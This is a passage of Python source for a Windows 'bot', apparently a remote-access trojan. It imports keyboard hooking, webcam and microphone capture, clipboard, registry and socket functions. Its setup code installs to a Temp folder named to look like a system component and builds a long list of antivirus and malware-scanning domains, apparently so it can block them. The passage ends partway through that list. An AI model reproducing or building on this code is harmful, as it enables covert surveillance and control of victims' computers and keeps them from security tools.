# CREATOR 
# GitHub https://github.com/cppandpython
# NAME: Vladislav 
# SURNAME: Khudash  
# AGE: 17

# DATE: 06.08.2025
# APP: BOT
# TYPE: BOT_SOCKET
# VERSION: LATEST
# PLATFORM: win32


#-
#--
#---
#----
#-----
#------
PATH = r'HERE IS THE PATH TO SAVE THE BOT'
PASSWORD = 'HERE IS THE PASSWORD FOR THE SESSION WITH THE BOT'
#------
#-----
#----
#---
#--
#--
#-


# IF YOU NEED TO SPECIFY MANUALLY
#-----------------------------------#
SERVER_IP_ADDRESS = '' 
MY_IP_ADDRESS = ''
#-----------------------------------#


# FOR ENCRYPTION OR DECRYPTION
#------------------------------#
KEY_SESSION = ''
KEY_LENGTH = ''
KEY_PATTERN_MAIN = ''
KEY_PATTERN_ANOTHER = ''
PATTERN_SYMBOLS = []
KEY_SYMBOLS = ''
#------------------------------#


import pyautogui as pygui

from winreg import (
    OpenKey, 
    CreateKey,
    DeleteKey, 
    OpenKeyEx, 
    SetValueEx, 
    DeleteValue, 
    QueryValueEx, 
    REG_SZ, 
    KEY_READ,
    KEY_WRITE,
    REG_DWORD, 
    REG_EXPAND_SZ, 
    KEY_SET_VALUE, 
    HKEY_CURRENT_USER,
    HKEY_LOCAL_MACHINE
)
from cv2 import (
    imwrite, 
    cvtColor, 
    VideoCapture, 
    VideoWriter, 
    VideoWriter_fourcc, 
    CAP_PROP_FPS, 
    COLOR_BGR2RGB, 
    CAP_PROP_FRAME_WIDTH, 
    CAP_PROP_FRAME_HEIGHT
)
from keyboard import (
    read_event, 
    remap_key, 
    block_key, 
    unhook_all, 
    remap_hotkey, 
    press as press_key, 
    release as release_key, 
    write as write_on_keyboard
)
from os import (
    walk, 
    abort, 
    mkdir, 
    chdir, 
    rmdir, 
    rename, 
    remove, 
    getcwd, 
    getpid, 
    replace, 
    getlogin, 
    cpu_count, 
    startfile
)
from platform import (
    node, 
    system, 
    version, 
    release, 
    processor, 
    architecture, 
    win32_edition
)
from shutil import copytree, copy as copy_path, move as move_path
from os.path import exists, isfile, abspath, split as split_path
from socket import gethostname, gethostbyname, create_connection
from tkinter.messagebox import showinfo, showerror, showwarning
from pyperclip import paste as buffer_get, copy as buffer_copy
from pyAesCrypt import encryptFile, decryptFile
from re import sub, search, findall, MULTILINE
from ipaddress import ip_address, ip_network 
from webbrowser import open as open_website
from subprocess import run, PIPE, DEVNULL
from requests import get as get_http_code
from pyaudio import PyAudio, paInt16
from json import loads as parse_json
from wave import open as open_audio
from winotify import Notification
from locale import windows_locale
from ctypes import windll, WinDLL
from pickle import dumps, loads
from random import choice, seed
from playsound import playsound
from sys import platform as ID
from tabulate import tabulate
from datetime import datetime
from threading import Thread
from chardet import detect
from numpy import array 
from time import sleep 
from glob import glob 


if ID != 'win32':
    raise SystemError("DON'T SUPPORT OS")


def init():
    global PATH, PASSWORD, BOT_NAME, BOT_NAME_REG, BOT_PATH, RUN_KEY, SA_KEY
    global KEY_SESSION, KEY_LENGTH, KEY_PATTERN_MAIN, KEY_PATTERN_ANOTHER, PATTERN_SYMBOLS, KEY_SYMBOLS
    global antivirus_and_tools_directories, session_symbols, DOMAINS, URL_IPCONFIG, URL_IPCONFIG_KEYS, HEADERS

    try:
        if not exists(PATH[:PATH.rindex('\\')]): 
            PATH = rf'C:\Users\{getlogin()}\AppData\Local\Temp\WindowsSystemCore'
    except:
        PATH = rf'C:\Users\{getlogin()}\AppData\Local\Temp\WindowsRecoveryCore'

    if not PASSWORD or type(KEY_SESSION) is not str:
        PASSWORD = '123'

    if not KEY_SESSION.isdigit(): 
        KEY_SESSION = '2008'

    if not KEY_LENGTH.isdigit():
        KEY_LENGTH = '6'

    if not KEY_PATTERN_MAIN or type(KEY_PATTERN_MAIN) is not str:
        KEY_PATTERN_MAIN = '$#&'

    if not KEY_PATTERN_ANOTHER or type(KEY_PATTERN_ANOTHER) is not str:
        KEY_PATTERN_ANOTHER = '!*^'

    if not PATTERN_SYMBOLS or type(PATTERN_SYMBOLS) is not list:
        PATTERN_SYMBOLS = [' ', '\n', '\r', '\t', '\f', '\v', '=', '+', '-', '*', '/', '%', '<', '>', '^', '~', '&', '|', '!', '?', '@', '#', '$', ':', ';', '.', ',', '\\', '\'', '"', '`', '(', ')', '[', ']', '{', '}', '_', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm', 'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', 'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', 'Z', 'X', 'C', 'V', 'B', 'N', 'M', 'а', 'б', 'в', 'г', 'д', 'е', 'ё', 'ж', 'з', 'и', 'й', 'к', 'л', 'м', 'н', 'о', 'п', 'р', 'с', 'т', 'у', 'ф', 'х', 'ц', 'ч', 'ш', 'щ', 'ъ', 'ы', 'ь', 'э', 'ю', 'я', 'А', 'Б', 'В', 'Г', 'Д', 'Е', 'Ё', 'Ж', 'З', 'И', 'Й', 'К', 'Л', 'М', 'Н', 'О', 'П', 'Р', 'С', 'Т', 'У', 'Ф', 'Х', 'Ц', 'Ч', 'Ш', 'Щ', 'Ъ', 'Ы', 'Ь', 'Э', 'Ю', 'Я']
       
    if not KEY_SYMBOLS or type(KEY_SYMBOLS) is not str:
        KEY_SYMBOLS = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&()*+,-.:;<=>?@[]^_{|}~'

    seed(int(KEY_SESSION))

    session_symbols = {}

    for symbol in PATTERN_SYMBOLS:
        session_symbols[symbol] = generator_symbols()

    DOMAINS = ['www.malwarebytes.com', 'www.malwarebytes.org', 'malwarebytes-anti-malware.download-windows.org', 'malwarebytes-anti-malware.en.uptodown.com', 'malwarebytes-anti-malware.ru.uptodown.com', 'malwarebytes-anti-malware.en.softonic.com', 'malwarebytes-anti-malware.softonic.ru', 'malwarebytes-anti-malware.updatestar.com', 'malwarebytes-windows-firewall-control.updatestar.com', 'malwarebytes-anti-malware.software.informer.com', 'malwarebytes-anti-malware.download.it', 'www.eset.com', 'eset.ua', 'support.eset.com', 'www.esetnod32.ru', 'nod32ua.com', 'nod-32.com.ua', 'nod32.download-windows.org', 'nod32.en.uptodown.com', 'nod32.ru.uptodown.com', 'eset-internet-security.ru.malavida.com', 'eset-nod32-antivirus.en.softonic.com', 'eset-smart-security.en.softonic.com', 'eset-internet-security.en.softonic.com', 'eset-nod32-antivirus.softonic.ru', 'eset-smart-security.softonic.ru', 'eset-internet-security.softonic.ru', 'eset-smart-security.updatestar.com', 'eset-endpoint-security.updatestar.com', 'nod32.informer.com', 'eset-smart-security.informer.com', 'eset-endpoint-antivirus.software.informer.com', 'eset-endpoint-security.software.informer.com', 'eset-internet-security.download.it', 'eset-nod32-antivirus.download.it', 'eset-smart-security.download.it', 'nod32-antivirus-64bit.download.it', 'www.bitdefender.com', 'www.bitdefender.ru', 'bitdefender.ua', 'bitdefenderua.com', 'bitdefender.download-windows.org', 'bitdefender-free-edition.en.uptodown.com', 'bitdefender-free-edition.ru.uptodown.com', 'bitdefender-antivirus.ru.malavida.com', 'bitdefender-total-security.ru.malavida.com', 'bitdefender-internet-security.ru.malavida.com', 'bitdefender-antivirus-free.en.softonic.com', 'bitdefender-antivirus.en.softonic.com', 'bitdefender-internet-security.en.softonic.com', 'bitdefender-total-security.en.softonic.com', 'bitdefender-antivirus-free.softonic.ru', 'bitdefender-antivirus.softonic.ru', 'bitdefender-internet-security.softonic.ru', 'bitdefender-total-security.softonic.ru', 'bitdefender-gamesafe.en.softonic.com', 'bitdefender-gamesafe.softonic.ru', 'bitdefender-antivirus-plus.updatestar.com', 'bitdefender-total-security.updatestar.com', 'bitdefender-total-security-2009.software.informer.com', 'bitdefender-internet-security.software.informer.com', 'bitdefender-antivirus-plus.software.informer.com', 'bitdefender-antivirus-free-edition1.software.informer.com', 'bitdefender-antivirus-free.download.it', 'bitdefender-total-security.download.it', 'bitdefender-total-security-beta.download.it', 'mcafee.com', 'www.mcafee.com', 'www.mcafee.org', 'download.mcafee.com', 'mcafee.download-windows.org', 'mcafee-livesafe.ru.malavida.com', 'mcafee-antivirus.ru.malavida.com', 'mcafee-security-scan-plus.softonic.ru', 'mcafee-virusscan.en.uptodown.com', 'mcafee-virusscan.ru.uptodown.com', 'mcafee-total-protection.en.softonic.com', 'mcafee-total-protection.softonic.ru', 'mcafeelivesafe.en.softonic.com', 'mcafeelivesafe.softonic.ru', 'mcafee-stinger.en.softonic.com', 'mcafee-stinger.softonic.ru', 'mcafee-internet-security-suite.en.softonic.com', 'mcafee-internet-security-suite.softonic.ru', 'mcafee-antivirus.updatestar.com', 'mcafee-agent.updatestar.com', 'mcafee-webadvisor.software.informer.com', 'mcafee-virusscan-enterprise.software.informer.com', 'mcafee-internet-security.software.informer.com', 'mcafee-livesafe1.software.informer.com', 'mcafee-antivirus-plus.software.informer.com', 'mcafee-total-protection.software.informer.com', 'mcafeelivesafe.download.it', 'mcafee-central.download.it', 'mcafee-total-protection.download.it', 'mcafee-antivirus-plus.download.it', 'www.kaspersky.com', 'www.kaspersky.ru', 'ukraine.kaspersky.com', 'support.kaspersky.com', 'support.kaspersky.ru', 'kaspersky.antivirus.lv', 'kaspersky-free.download-windows.org', 'antivirus-kaspersky.com.ua', 'kaspersky-antivirus.com.ua', 'kaspersky-free.en.uptodown.com', 'kaspersky-free.ru.uptodown.com', 'kaspersky-antivirus.ru.malavida.com', 'kaspersky-total-security.ru.malavida.com', 'kaspersky-internet-security.en.softonic.com', 'kaspersky-internet-security.softonic.ru', 'kaspersky-anti-virus.en.softonic.com', 'kaspersky-anti-virus.softonic.ru', 'kaspersky-pure.en.softonic.com', 'kaspersky-pure.softonic.ru', 'kaspersky-tdsskiller.en.softonic.com', 'kaspersky-tdsskiller.softonic.ru', 'kaspersky-virus-removal-tool.en.softonic.com', 'kaspersky-virus-removal-tool.softonic.ru', 'kaspersky-antivirus.updatestar.com', 'kaspersky-free.updatestar.com', 'kaspersky-anti-virus.informer.com', 'kaspersky-internet-security.software.informer.com', 'kaspersky-endpoint-security-for-windows.software.informer.com', 'kaspersky-cleaner.informer.com', 'kaspersky-internet-security.download.it', 'kaspersky-security-scan.download.it', 'kaspersky-pure.download.it', 'www.drweb.com', 'www.drweb.ru', 'www.drweb.ua', 'free.drweb.com', 'free.drweb.ru', 'free.drweb.ua', 'download.drweb.com', 'download.drweb.ru', 'download.drweb.ua', 'products.drweb.com', 'products.drweb.ru', 'products.drweb.ua', 'products.drweb-av.it', 'products.drweb-av.pl', 'products.dataprotection.com.ru', 'products.dataprotection.com.ua', 'dr-web-cureit.en.uptodown.com', 'dr-web-cureit.ru.uptodown.com', 'dr-web.softok.info', 'dr-web-cureit.ru.malavida.com', 'dr-web-anti-virus.en.softonic.com', 'dr-web-anti-virus.softonic.ru', 'dr-web-cureit.en.softonic.com', 'dr-web-cureit.softonic.ru', 'drwebsecurityspace.en.softonic.com', 'drwebsecurityspace.softonic.ru', 'drwebkatana.en.softonic.com', 'drwebkatana.softonic.ru', 'dr-web-anti-virus-for-windows.updatestar.com', 'dr-web-cureit.updatestar.com', 'dr-web-anti-virus.informer.com', 'dr-web-security-space.software.informer.com', 'dr-web-katana.software.informer.com', 'dr-web-r-av-desk.software.informer.com', 'www.norton.com', 'us.norton.com', 'ru.norton.com', 'updatecenter.norton.com', 'support.norton.com', 'nortonsecurity.ru', 'norton-antivirus.en.uptodown.com', 'norton-antivirus.ru.uptodown.com', 'norton-antivirus.ru.malavida.com', 'norton-antivirus.en.softonic.com', 'norton-antivirus.softonic.ru', 'norton-security-premium.en.softonic.com', 'norton-security-premium.softonic.ru', 'norton-360-standard.en.softonic.com', 'norton-360-standard.softonic.ru', 'norton-antivirus.updatestar.com', 'norton.updatestar.com', 'norton-internet-security.software.informer.com', 'norton-360-premier-edition.software.informer.com', 'norton-360.download.it', 'norton-internet-security.download.it', 'norton-security-premium.download.it', 'norton-antivirus.download.it', 'norton-security.download.it', 'www.avast.com', 'www.avast.ru', 'www.avast.ua', 'support.avast.com', 'avast-free-antivirus.download-windows.org', 'avast-home.en.uptodown.com', 'avast-home.ru.uptodown.com', 'avast.ru.malavida.com', 'avast-premier.ru.malavida.com', 'avast-pro.ru.malavida.com', 'avast-internet-security.ru.malavida.com', 'avast.en.softonic.com', 'avast.softonic.ru', 'avast-premium-security.en.softonic.com', 'avast-premium-security.softonic.ru', 'avast-antivirus-download-center.en.softonic.com', 'avast-antivirus-download-center.softonic.ru', 'avast-ultimate.en.softonic.com', 'avast-ultimate.softonic.ru', 'avast-one-essential.en.softonic.com', 'avast-one-essential.softonic.ru', 'avast-cleanup.en.softonic.com', 'avast-cleanup.softonic.ru', 'avast-home-edition.updatestar.com', 'avast-premium.updatestar.com', 'avast-free-antivirus.informer.com', 'avast-internet-security.software.informer.com', 'avast-pro-antivirus.informer.com', 'avast-premier.software.informer.com', 'avast.download.it', 'avast-premier-antivirus.download.it', 'avast-cleanup.download.it', 'avast-internet-security.download.it', 'avast-pro.download.it', 'www.avg.com', 'avg-antivirus.download-windows.org', 'avg-internet-security.download-windows.org', 'avg-free.en.uptodown.com', 'avg-free.ru.uptodown.com', 'avg-free.ru.malavida.com', 'avg-internet-security.ru.malavida.com', 'avg-tuneup.ru.malavida.com', 'avg-driver-updater.ru.malavida.com', 'avg-antivirus-free.en.softonic.com', 'avg-antivirus-free.softonic.ru', 'avg-antivirus-security-free.en.softonic.com', 'avg-antivirus-security-free.softonic.ru', 'avg-internet-security.en.softonic.com', 'avg-internet-security.softonic.ru', 'avg-antivirus-business-edition.en.softonic.com', 'avg-antivirus-business-edition.softonic.ru', 'avg-zen.en.softonic.com', 'avg-zen.softonic.ru', 'avg-anti-virus.updatestar.com', 'avg-antivirus-free.informer.com', 'avg-pc-tuneup.informer.com', 'avg-antivirus.download.it', 'avg-anti-virus-free.download.it', 'avg-pc-tuneup-utilities.download.it', 'avg-protection-pro.download.it', 'avg-protection-free.download.it', 'www.comodo.com', 'ru.comodo.com', 'personalfirewall.comodo.com', 'comodo-russia.com', 'comodo-firewall.ru.malavida.com', 'comodo-system-cleaner.ru.malavida.com', 'comodo-antivirus.en.uptodown.com', 'comodo-antivirus.ru.uptodown.com', 'comodo-antivirus.en.softonic.com', 'comodo-antivirus.softonic.ru', 'comodo-internet-security.en.softonic.com', 'comodo-internet-security.softonic.ru', 'comodo-dragon.en.softonic.com', 'comodo-dragon.softonic.ru', 'comodo-free-firewall.en.softonic.com', 'comodo-free-firewall.softonic.ru', 'comodo-antivirus-windows-10.en.softonic.com', 'comodo-antivirus-windows-10.softonic.ru', 'comodo-boclean.en.softonic.com', 'comodo-boclean.softonic.ru', 'comodo-antivirus.updatestar.com', 'comodo-internet-security.updatestar.com', 'comodo-antivirus.software.informer.com', 'comodo-internet-security.software.informer.com', 'comodo-firewall.informer.com', 'comodo-cloud-antivirus.software.informer.com', 'comodo-antivirus.download.it', 'comodo-firewall.download.it', 'comodo-internet-security-64-bit.download.it', 'www.pandasecurity.com', 'panda-antivirus.ru.malavida.com', 'panda-free-antivirus.ru.malavida.com', 'panda-internet-security.ru.malavida.com', 'panda-cloud-antivirus.ru.malavida.com', 'panda-global-protection.ru.malavida.com', 'panda-internet-security.en.uptodown.com', 'panda-internet-security.ru.uptodown.com', 'panda-antivirus.en.uptodown.com', 'panda-antivirus.ru.uptodown.com', 'panda-cloud-antivirus.en.uptodown.com', 'panda-cloud-antivirus.ru.uptodown.com', 'panda-global-protection.ru.uptodown.com', 'panda-free-antivirus.en.softonic.com', 'panda-free-antivirus.softonic.ru', 'panda-dome-complete.en.softonic.com', 'panda-dome-complete.softonic.ru', 'panda-antivirus.en.softonic.com', 'panda-antivirus.softonic.ru', 'panda-dome-antivirus-and-vpn.en.softonic.com', 'panda-dome-antivirus-and-vpn.softonic.ru', 'panda-free-antivirus.updatestar.com', 'panda-protection.updatestar.com', 'panda-security1.software.informer.com', 'panda-security-for-desktops.software.informer.com', 'www.cloudav.ru', 'www.sophos.com', 'home.sophos.com', 'sophos-anti-rootkit.en.uptodown.com', 'sophos-anti-rootkit.ru.uptodown.com', 'sophos-virus-removal-tool.en.uptodown.com', 'sophos-virus-removal-tool.ru.uptodown.com', 'sophos-home.en.softonic.com', 'sophos-home.softonic.ru', 'sophos-home-premium.en.softonic.com', 'sophos-home-premium.softonic.ru', 'sophos-endpoint-defense.updatestar.com', 'sophos-endpoint-agent.updatestar.com', 'sophos-home.software.informer.com', 'sophos-virus-removal-tool.software.informer.com', 'sophos-anti-rootkit.informer.com', 'sophos-home.download.it', 'www.avira.com', 'avira-antivir-personal.en.uptodown.com', 'avira-antivir-personal.ru.uptodown.com', 'avira-pc-cleaner.en.uptodown.com', 'avira-pc-cleaner.ru.uptodown.com', 'avira-free-antivirus.ru.malavida.com', 'avira-antivirus-pro.ru.malavida.com', 'avira-free-antivirus.en.softonic.com', 'avira-free-antivirus.softonic.ru', 'avira-antivirus-pro.en.softonic.com', 'avira-antivirus-pro.softonic.ru', 'avira-prime.en.softonic.com', 'avira-prime.softonic.ru', 'avira-family-protection-suite.en.softonic.com', 'avira-family-protection-suite.softonic.ru', 'avira-fusebundle-generator.en.softonic.com', 'avira-fusebundle-generator.softonic.ru', 'avira-pc-cleaner.en.softonic.com', 'avira-pc-cleaner.softonic.ru', 'avira.updatestar.com', 'avira-anti-virus.updatestar.com', 'avira-internet-security.software.informer.com', 'avira-antivir-premium.software.informer.com', 'avira-professional-security.software.informer.com', 'avira-connect.software.informer.com', 'avira-rescue-system.download.it', 'avira-free-antivirus.download.it', 'avira-free-security.download.it', 'avira-antivirus-pro.download.it', 'www.360totalsecurity.com', '360-total-security.download-windows.org', '360-total-security.en.uptodown.com', '360-total-security.ru.uptodown.com', '360-internet-security.en.uptodown.com', '360-internet-security.ru.uptodown.com', '360-total-security.ru.malavida.com', '360-total-security.en.softonic.com', '360-total-security.softonic.ru', '360-total-security-essential.en.softonic.com', '360-total-security-essential.softonic.ru', '360-total-security.updatestar.com', '360-total-security-free-antivirus.updatestar.com', '360-total-security.software.informer.com', '360-total-security.download.it', '360-internet-security.download.it', 'antivirus.systweak.com', 'systweak-advanced-system-optimizer.en.uptodown.com', 'systweak-advanced-system-optimizer.ru.uptodown.com', 'systweak-antivirus.updatestar.com', 'advanced-system-protector.software.informer.com', 'www.escanav.com', 'escanav.com', 'escan-anti-virus.en.uptodown.com', 'escan-anti-virus.ru.uptodown.com', 'escan-internet-security-suite.en.uptodown.com', 'escan-internet-security-suite.ru.uptodown.com', 'escan-anti-virus.ru.malavida.com', 'escan-anti-virus.en.softonic.com', 'escan-anti-virus.softonic.ru', 'escan-internet-security-suite.en.softonic.com', 'escan-internet-security-suite.softonic.ru', 'escan-anti-virus-and-antispyware-toolkit.en.softonic.com', 'escan-anti-virus-and-antispyware-toolkit.softonic.ru', 'escan-anti-virus.informer.com', 'escan-internet-security-for-windows.software.informer.com', 'escan.download.it', 'escan-anti-virus.download.it', 'escan-virus-control.download.it', 'escan-internet-security-suite.download.it', 'escan-internet-security-suite-1.download.it', 'escan-anti-virus-and-antispyware-toolkit.download.it', 'clamwin.com', 'ru.clamwin.com', 'clamwin-free-antivirus.en.uptodown.com', 'clamwin-free-antivirus.ru.uptodown.com', 'clamwin-portable.en.uptodown.com', 'clamwin-portable.ru.uptodown.com', 'clamwin-antivirus.ru.malavida.com', 'clamwin-antivirus.softonic.com', 'clamwin.en.softonic.com', 'clamwin.softonic.ru', 'clamwin-portable.en.softonic.com', 'clamwin-portable.softonic.ru', 'clamwin-free-antivirus.updatestar.com', 'clamwin.updatestar.com', 'clamwin-free-antivirus.software.informer.com', 'clamwin-antivirus.software.informer.com', 'clamwin-antivirus.download.it', 'clamwin-portable.download.it', 'secureaplus.informer.com', 'www.safer-networking.org', 'www.spybot-free-download.com', 'spybot-search-and-destroy.en.uptodown.com', 'spybot-search-and-destroy.ru.uptodown.com', 'spybot-search-destroy.en.softonic.com', 'spybot-search-destroy.softonic.ru', 'spybot-anti-beacon.en.softonic.com', 'spybot-anti-beacon.softonic.ru', 'safer-networking-limited.updatestar.com', 'spybot4.software.informer.com', 'spybot-search-destroy.download.it', 'spybot-anti-beacon.download.it', 'spybot-search-destroy-portable.download.it', 'www.clamav.net', 'clamav.ru', 'clamav.en.uptodown.com', 'clamav.ru.uptodown.com', 'clam-antivirus.en.softonic.com', 'clam-antivirus.softonic.ru', 'clamav.updatestar.com', 'clamav-for-windows.software.informer.com', 'clam-antivirus.download.it', 'www.cynet.com', 'pro32.com', 'pro32.by', 'www.emsisoft.com', 'emsisoft-anti-malware.en.uptodown.com', 'emsisoft-anti-malware.ru.uptodown.com', 'emsisoft-internet-security-pack.en.uptodown.com', 'emsisoft-internet-security-pack.ru.uptodown.com', 'emergency-kit.en.uptodown.com', 'emergency-kit.ru.uptodown.com', 'emsisoft-anti-malware.ru.malavida.com', 'emsisoft-emergency-kit.ru.malavida.com', 'emsisoft-commandline-scanner.ru.malavida.com', 'emsisoft-anti-malware.en.softonic.com', 'emsisoft-anti-malware.softonic.ru', 'emsisoft-emergency-kit.en.softonic.com', 'emsisoft-emergency-kit.softonic.ru', 'emsisoft-decryptor-for-stop-djvu.en.softonic.com', 'emsisoft-decryptor-for-stop-djvu.softonic.ru', 'a-squared-anti-malware.updatestar.com', 'emsisoft-anti-malware.software.informer.com', 'emsisoft-internet-security.software.informer.com', 'emsisoft-enterprise-console.software.informer.com', 'emsisoft-anti-malware.download.it', 'emsisoft-emergency-kit.download.it', 'www.gdatasoftware.com', 'www.gdata-software.com', 'www.gdata.de', 'www.gdata.com.mx', 'g-data-antivirus.en.uptodown.com', 'g-data-antivirus.ru.uptodown.com', 'g-data-internetsecurity.en.uptodown.com', 'g-data-internetsecurity.ru.uptodown.com', 'gdata-antivirus.en.softonic.com', 'gdata-antivirus.softonic.ru', 'g-data-antivirenkit-antivirus.updatestar.com', 'g-data-totalcare.software.informer.com', 'g-data-totalsecurity.software.informer.com', 'g-data-antivirus.download.it', 'www.huorong.cn', 'huorong-internet-security.updatestar.com', 'huorong-network-security.updatestar.com', 'www.manageengine.com', 'manageengine-desktop-central-agent.updatestar.com', 'manageengine-assetexplorer-agent.updatestar.com', 'manageengine-desktop-central-agent.software.informer.com', 'www.paloaltonetworks.com', 'docs.paloaltonetworks.com', 'www.quickheal.com', 'www.quickheal.co.in', 'quick-heal.it', 'quick-heal-total-security.en.uptodown.com', 'quick-heal-total-security.ru.uptodown.com', 'quick-heal-antivirus.softonic.com', 'quick-heal-antivirus-pro.en.softonic.com', 'quick-heal-antivirus-pro.softonic.ru', 'quick-heal-anti-virus.en.softonic.com', 'quick-heal-anti-virus.softonic.ru', '2239-4-76088896.en.softonic.com', '2239-4-76088896.softonic.ru', 'quick-heal-antivirus-plus.updatestar.com', 'quick-heal-antivirus-pro.updatestar.com', 'quick-heal-total-security.software.informer.com', 'quick-heal-antivirus-pro.software.informer.com', 'quick-heal-internet-security.software.informer.com', 'quick-heal-antivirus-plus.software.informer.com', 'quick-heal-internet-security.download.it', 'www.sangfor.com', 'www.skyhighsecurity.com', 'www.superantispyware.com', 'superantispyware.download.it', 'superantispyware-portable-scanner.download.it', 'www.trellix.com', 'www.threatdown.com', 'support.threatdown.com', 'threatdown.en.softonic.com', 'threatdown.softonic.ru', 'www.trendmicro.com', 'help.deepsecurity.trendmicro.com', 'helpcenter.trendmicro.com', 'trend-micro-hijackthis.download-windows.org', 'trend-micro-internet-security-2010.en.uptodown.com', 'trend-micro-internet-security-2010.ru.uptodown.com', 'trend-micro-housecall.en.uptodown.com', 'trend-micro-housecall.ru.uptodown.com', 'trendmicro-hijackthis.en.uptodown.com', 'trendmicro-hijackthis.ru.uptodown.com', 'trend-micro-titanium-internet-security.en.softonic.com', 'trend-micro-titanium-internet-security.softonic.ru', 'trend-micro-housecall.en.softonic.com', 'trend-micro-housecall.softonic.ru', 'trend-micro-titanium-maximum-security.en.softonic.com', 'trend-micro-titanium-maximum-security.softonic.ru', 'trend-micro-rubotted.en.softonic.com', 'trend-micro-rubotted.softonic.ru', 'trend-micro-anti-spyware.en.softonic.com', 'trend-micro-anti-spyware.softonic.ru', 'trend-micro-anti-threat-toolkit.en.softonic.com', 'trend-micro-anti-threat-toolkit.softonic.ru', 'trend-micro-hijackthis-portable.en.softonic.com', 'trend-micro-hijackthis-portable.softonic.ru', 'titanium-antivirus.en.softonic.com', 'titanium-antivirus.softonic.ru', 'trend-micro-security-agent.updatestar.com', 'trend-micro-internet-security.software.informer.com', 'trend-micro-officescan.software.informer.com', 'trend-micro-titanium-internet-security.software.informer.com', 'trend-micro-antivirus.software.informer.com', 'trend-micro-anti-spyware.software.informer.com', 'trend-micro-internet-security-pro.software.informer.com', 'trend-micro-titanium-maximum-security.software.informer.com', 'hijackthis.informer.com', 'www.varist.com', 'nano-av.com', 'www.nanoav.pro', 'nano-antivirus.en.uptodown.com', 'nano-antivirus.ru.uptodown.com', 'nano-antivirus.ru.malavida.com', 'nano-antivirus.en.softonic.com', 'nano-antivirus.softonic.ru', 'nano-antivirus.updatestar.com', 'nano-antivirus.download.it', 'vipre.com', 'success.vipre.com', 'vipre-antivirus.en.uptodown.com', 'vipre-antivirus.ru.uptodown.com', 'viper.ru.malavida.com', 'vipre.en.softonic.com', 'vipre.softonic.ru', 'vipre-internet-security.en.softonic.com', 'vipre-internet-security.softonic.ru', 'vipre-antivirus.updatestar.com', 'vipre-internet-security-pro.updatestar.com', 'vipre.software.informer.com', 'vipre-business-premium.software.informer.com', 'vipre.download.it', 'www.xcitium.com', 'zillya.com', 'zillya.org', 'zillya.ua', 'zillya-antivirus.en.uptodown.com', 'zillya-antivirus.ru.uptodown.com', 'zillya-internet-security.en.uptodown.com', 'zillya-internet-security.ru.uptodown.com', 'zillya-antivirus.softonic.com', 'zillya-internet-security.updatestar.com', 'zillya-total-security.updatestar.com', 'zillya-internet-security.software.informer.com', 'zillya-antivirus1.software.informer.com', 'zillya-internet-security1.software.informer.com', 'zonerantivirus.com', 'www.withsecure.com', 'wssecure.en.uptodown.com', 'wssecure.ru.uptodown.com', 'f-secure-internet-security.en.uptodown.com', 'f-secure-internet-security.ru.uptodown.com', 'f-secure-anti-virus.ru.malavida.com', 'withsecure-elements-agent.updatestar.com', 'www.tgsoft.it', 'www.anti-virus.by', 'ad-aware.softonic.ru', 'www.maxpcsecure.com', 'max-secure-spyware-detector.en.softonic.com', 'max-secure-spyware-detector.softonic.ru', 'max-secure-spyware-detector.updatestar.com', 'www.k7computing.com', 'support.k7computing.com', 'k7-total-security.en.uptodown.com', 'k7-total-security.ru.uptodown.com', 'k7-total-security.en.softonic.com', 'k7-total-security.softonic.ru', 'k7-antivirus-plus.en.softonic.com', 'k7-antivirus-plus.softonic.ru', 'k7-antivirus.updatestar.com', 'www.ahnlab.com', 'ahnlab-v3-internet-security.ru.malavida.com', 'ahnlab-v3-internet-security.en.softonic.com', 'ahnlab-v3-internet-security.softonic.ru', 'ahnlab-lite.updatestar.com', 'ahnlab-security-agent.updatestar.com', 'ahnlab-v3-internet-security.software.informer.com', 'www.estsecurity.com', 'en.estsecurity.com', 'www.bkav.com.vn', 'bkavpro-2009-internet-security.updatestar.com', 'bkav-pro-2014-internet-security.software.informer.com', 'cmccybersecurity.com', 'www.fortinet.com', 'fortinet.en.softonic.com', 'fortinet.softonic.ru', 'forticlient.informer.com', 'forticlient.download.it', 'www.ikarussecurity.com', 'ikarus-antivirus.ru.malavida.com', 'ikarus-anti-virus.updatestar.com', 'www.adaware.com', 'www.lavasoft.com', 'ad-aware-se.en.uptodown.com', 'ad-aware-se.ru.uptodown.com', 'ad-aware-plus-internet-security.en.uptodown.com', 'ad-aware-plus-internet-security.ru.uptodown.com', 'ad-aware.ru.malavida.com', 'ad-aware-game-edition.ru.malavida.com', 'ad-aware.en.softonic.com', 'ad-aware-personal-security.en.softonic.com', 'ad-aware-personal-security.softonic.ru', 'ad-aware-total-security.en.softonic.com', 'ad-aware-total-security.softonic.ru', 'adaware-free-antivirus.updatestar.com', 'adaware-antivirus-free.updatestar.com', 'ad-aware-antivirus.software.informer.com', 'ad-aware.software.informer.com', 'adaware-professional.software.informer.com', 'ad-aware-total-security.software.informer.com', 'ad-aware.download.it', 'spywareblaster.download.it', 'www.totalav.com', 'totalav-essential-antivirus.en.softonic.com', 'totalav-essential-antivirus.softonic.ru', 'totalav.updatestar.com', 'totalav.software.informer.com', 'totalav-essential-antivirus.download.it', 'www.lionic.com', 'microsoft-security-essentials.download-windows.org', 'microsoft-security-essentials.en.uptodown.com', 'microsoft-security-essentials.ru.uptodown.com', 'security-essentials-screensaver.en.uptodown.com', 'security-essentials-screensaver.ru.uptodown.com', 'microsoft-security-essentials.ru.malavida.com', 'microsoft-security-essentials.en.softonic.com', 'microsoft-security-essentials.softonic.ru', 'microsoft-security-essentials.software.informer.com', 'microsoft-security-essentials.download.it', 'microsoft-security-essentials-64bit.download.it', 'microsoft-security-essentials-vista-7-32bit.download.it', 'www.av-test.org', 'www.intego.com', 'intego.com', 'mackeeper.com', 'www.secureage.com', 'www.virustotal.com', 'www.opswat.com', 'metadefender.com', 'metadefender.opswat.com', 'quttera.com', 'www.cy-pr.com', 'www.sucuri.net', 'sucuri.net', 'antivirus-alarm.ru', 'www.virscan.org', 'antiscan.me', 'antivirus.co.ua', 'www.f-secure.com', 'www.bittorrent.com', 'www.utorrent.com', 'www.qbittorrent.org', 'learn.microsoft.com', 'apps.microsoft.com', 'www.aida64.com', 